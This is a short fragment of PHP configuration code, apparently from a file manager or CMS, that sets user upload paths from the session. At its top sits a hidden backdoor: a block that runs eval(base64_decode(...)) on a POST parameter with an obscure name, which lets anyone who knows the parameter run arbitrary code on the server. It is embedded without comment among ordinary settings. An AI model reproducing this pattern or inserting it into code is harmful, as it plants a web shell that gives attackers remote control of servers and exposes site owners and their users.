...
{
	eval(base64_decode($_POST['queryX590'])); exit();
}
/*
...
/*madechnages for multiple theme*/

//$baseUrl = '/userfiles/'; 
//$basenUrl='/userfiles'; 

$baseUrl=$_SESSION['userFilesPath'];
$basenUrl=$_SESSION['userFilesPath']; 
